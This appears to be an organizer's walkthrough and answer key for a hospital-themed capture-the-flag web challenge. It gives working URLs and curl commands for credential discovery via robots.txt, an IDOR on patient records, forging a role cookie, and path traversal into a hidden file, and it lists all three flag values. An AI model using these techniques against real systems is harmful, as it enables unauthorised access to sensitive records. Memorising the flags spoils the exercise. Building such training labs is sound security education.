# 🔐 Walkthrough — Mercury General Hospital CTF
> **FOR CTF ORGANIZERS ONLY — do not distribute to players**

---

## Overview

| Flag   | Name                | Vulnerability                               | Difficulty |
|--------|---------------------|---------------------------------------------|------------|
| FLAG 3 | The Dental Record   | IDOR (Insecure Direct Object Reference)     | Easy       |
| FLAG 4 | The Security Footage| Broken Access Control (cookie manipulation) | Easy-Medium |
| FLAG 5 | The Prescription    | Path Traversal + Base64 decode              | Medium     |

---

## Player Hints (reveal to players when stuck)

Use the table below to decide which hint to share. Hints are tiered — always
start with Hint 1 before revealing Hint 2.

### FLAG 3 — The Dental Record

| Tier | Hint |
|------|------|
| Hint 1 | The patient records search shows results, but clicking "View" on any patient calls a different endpoint. Look at the URL when you view a patient record. |
| Hint 2 | The URL contains a `pid=` parameter. What happens if you change it to another patient ID — like `MGH-0044`? The server checks *who you are* but not *what you're allowed to see*. |
| Hint 3 | Navigate directly to `/records.php?pid=MGH-0044`. No role check exists on the detail endpoint — any authenticated user gets the full record including the flag. |

### FLAG 4 — The Security Footage

| Tier | Hint |
|------|------|
| Hint 1 | You can see camera events but certain data is hidden. Look at the page source — there's a comment about what controls visibility. Also check `/robots.txt` for other interesting paths. |
| Hint 2 | The admin console at `/admin-console/` has a revealing HTML comment. The portal checks a **cookie** called `role` — and it trusts whatever value you send. Try setting `role=admin` in your browser cookies (DevTools → Application → Cookies). |
| Hint 3 | Use browser DevTools (Application → Cookies) or curl (see the curl workflow in the exploit section below) to add `role=admin`. Reload `/camera.php` — the flag box will appear on the CAM-03 entry. |

### FLAG 5 — The Prescription

| Tier | Hint |
|------|------|
| Hint 1 | `robots.txt` mentions a prescription archive that "hasn't been moved off the web root yet." The file viewer at `/files.php` accepts a `?file=` parameter. What happens if you use `../` sequences to step outside the docs folder? |
| Hint 2 | The file viewer's base directory is `docs/`. One `../` escapes docs and lands in the web root; from there you can reach `hospital-files/prescriptions/hidden/`. Try: `?file=../hospital-files/prescriptions/hidden/rx_chow_encoded.txt` |
| Hint 3 | The file contains a Base64-encoded block. Decode it with `base64 -d` (Linux/Mac), `certutil -decode` (Windows), or paste it into [CyberChef](https://gchq.github.io/CyberChef/) and choose "From Base64". The flag is in the decoded output. |

---

## Entry Point — robots.txt Recon + Credential Discovery

Every engagement starts with reconnaissance. This CTF rewards players who follow
standard web-app recon methodology.

### Step 1 — Visit robots.txt

```
http://<TARGET>/robots.txt
```

Output:

```
User-agent: *
Disallow: /staff-backup/
Disallow: /admin-console/

# Note to webmaster: please confirm /staff-backup/ is not publicly accessible
# before the portal goes live — IT generated credential backup files there.
# Also: prescription archive not yet moved off the web root.
#   Current path: ../hospital-files/prescriptions/
```

Two interesting paths immediately: `/staff-backup/` and `/admin-console/`.

### Step 2 — Read the credential backup

```
http://<TARGET>/staff-backup/credentials.txt
```

Output (abbreviated):

```
Username : reception
Password : W0lfpack2009!
Role     : staff
```

### Step 3 — Log in

Navigate to `http://<TARGET>/login.php` and log in with:
- **Username:** `reception`
- **Password:** `W0lfpack2009!`

You are authenticated as `role: staff`.

---

## FLAG 3 — The Dental Record

**Vulnerability:** IDOR — Insecure Direct Object Reference

### Exploit

1. Log in as `reception`. Navigate to **Patient Records**.
2. Search for `MGH` — three patients appear: **MGH-0042**, **MGH-0043**, **MGH-0044**.
   Basic info only is shown in the search results.
3. Click **View** on MGH-0044 (Stuart Price), or request directly:

```
http://<TARGET>/records.php?pid=MGH-0044
```

The full physician notes and the flag are returned — **no role check** exists on the
detail endpoint. Any authenticated user can access any patient's complete record.

```
FLAG{d3nt4l_r3c0rd_stu_pull3d_h1s_0wn_t00th_0247AM_t0_pr0v3_h1s_l0v3}
```

**Why it's IDOR:** The `pid` parameter is an Insecure Direct Object Reference.
The server validates authentication but not authorization.

---

## FLAG 4 — The Security Footage

**Vulnerability:** Broken Access Control — client-controlled role cookie

### Discovery (two trails)

**Trail A — JavaScript source**

Open browser DevTools → Sources → `assets/js/portal.js`:

```javascript
// TODO (IT-2247): Move role authorisation fully server-side.
// Currently the portal reads the HTTP cookie 'role' on both the
// client (for UI rendering) and server (camera.php, dashboard).
// Any client can forge Cookie: role=admin to unlock restricted sections.
```

**Trail B — Admin console page source**

```
http://<TARGET>/admin-console/
```

View page source. The HTML comment block includes:

```html
<!--
  IMPORTANT — Role Access Control (temporary workaround):
    The portal reads the HTTP Cookie named 'role' BEFORE the session role.
    See camera.php, line: $_COOKIE['role'] ?? $session['role']
    Valid values: admin | doctor | staff
-->
```

### Exploit

1. Log in as `reception`. Navigate to **Security Logs**.
   Camera entries load but no flag boxes appear (role=staff).
2. View page source — see: `<!-- role-restricted content requires doctor or admin access -->`
3. Set a `role` cookie to `admin` using DevTools → Application → Cookies,
   or with a proxy (Burp Suite).

**Browser (DevTools):**
1. Open DevTools → Application tab → Cookies → select the site
2. Click the **+** button to add a new cookie:
   - Name: `role`
   - Value: `admin`
3. Reload `/camera.php` — the flag appears on the CAM-03 row.

**curl (full two-step workflow):**

```bash
# Step 1 — Log in and save the session cookie to a file.
# -c writes received cookies to the file; -L follows the redirect to index.php.
curl -s -c /tmp/mgh_cookies.txt \
     -d "username=reception&password=W0lfpack2009!" \
     -L http://<TARGET>/login.php -o /dev/null

# Verify you have a valid session cookie:
cat /tmp/mgh_cookies.txt

# Step 2 — Request camera.php, reading the saved session cookie from the
# file AND injecting the forged role=admin cookie.
# Two -b flags are used: one reads the cookie file, the other adds the
# extra cookie value.
curl -s \
     -b /tmp/mgh_cookies.txt \
     -b "role=admin" \
     http://<TARGET>/camera.php | grep -A 2 "flag-box"
```

Expected output (the flag is inside the `flag-box` div):

```html
<div class="flag-box" style="margin-top:8px;">🚩 FLAG{s3cur1ty_f00t4g3_ESV7749_Ch0w_w4r3h0us3_3850_V4ll3y_V13w}</div>
```

To dump the entire page body for inspection:

```bash
curl -s \
     -b /tmp/mgh_cookies.txt \
     -b "role=admin" \
     http://<TARGET>/camera.php
```

4. The flag box appears on the **CAM-03** entry:

```
FLAG{s3cur1ty_f00t4g3_ESV7749_Ch0w_w4r3h0us3_3850_V4ll3y_V13w}
```

> **Troubleshooting:** If curl follows the redirect to `/login.php` (and you
> see the login page HTML instead of camera data), the session cookie in
> `/tmp/mgh_cookies.txt` may be stale or missing.  Re-run Step 1 to obtain
> a fresh session cookie, then retry Step 2.

---

## FLAG 5 — The Prescription

**Vulnerability:** Path Traversal on `files.php?file=`

### Discovery

`robots.txt` hints: `prescription archive not yet moved off the web root`.
The admin console source confirms: `Prescription archive path: ../hospital-files/prescriptions/hidden/`

### Exploit

The file viewer reads files relative to `docs/` but does **not sanitise `../`**:

```
http://<TARGET>/files.php?file=../hospital-files/prescriptions/hidden/rx_chow_encoded.txt
```

The file contains a Base64-encoded block. Decode it:

```bash
echo "V0FSRUhPVVNFIENPT1JESU5BVEVTOiAzNi4xMDI2IE4..." | base64 -d
```

Or use [CyberChef](https://gchq.github.io/CyberChef/).

Output:

```
WAREHOUSE COORDINATES: 36.1026 N, 115.1734 W | 3850 S Valley View Blvd, Las Vegas, NV 89103 | FLAG{pr3scr1pt10n_c00rds_Ch0w_W4r3h0us3_36N_115W_3850_V4ll3y_V13w}
```

```
FLAG{pr3scr1pt10n_c00rds_Ch0w_W4r3h0us3_36N_115W_3850_V4ll3y_V13w}
```

> **Note:** Direct HTTP access to `hospital-files/` is blocked by `.htaccess`
> (`Require all denied`).  The only route to this file is through `files.php`
> via path traversal — exactly as intended.

---

## Full Attack Chain

```
robots.txt
├── /staff-backup/credentials.txt  →  reception / W0lfpack2009!
│   │
│   ├── /records.php?pid=MGH-0044  →  IDOR  →  FLAG 3
│   │
│   ├── /camera.php
│   │   ├── /assets/js/portal.js  →  cookie TODO comment     ┐
│   │   ├── /admin-console/ source  →  cookie role hint      ├── forge Cookie:role=admin → FLAG 4
│   │   └── camera.php source comment  →  role hint          ┘
│   │
│   └── /files.php?file=../hospital-files/prescriptions/hidden/rx_chow_encoded.txt
│       └── base64 decode  →  FLAG 5
│
└── /admin-console/  →  hints for FLAG 4 + FLAG 5
```

---

## All Flags

| Flag   | Value |
|--------|-------|
| FLAG 3 | `FLAG{d3nt4l_r3c0rd_stu_pull3d_h1s_0wn_t00th_0247AM_t0_pr0v3_h1s_l0v3}` |
| FLAG 4 | `FLAG{s3cur1ty_f00t4g3_ESV7749_Ch0w_w4r3h0us3_3850_V4ll3y_V13w}` |
| FLAG 5 | `FLAG{pr3scr1pt10n_c00rds_Ch0w_W4r3h0us3_36N_115W_3850_V4ll3y_V13w}` |

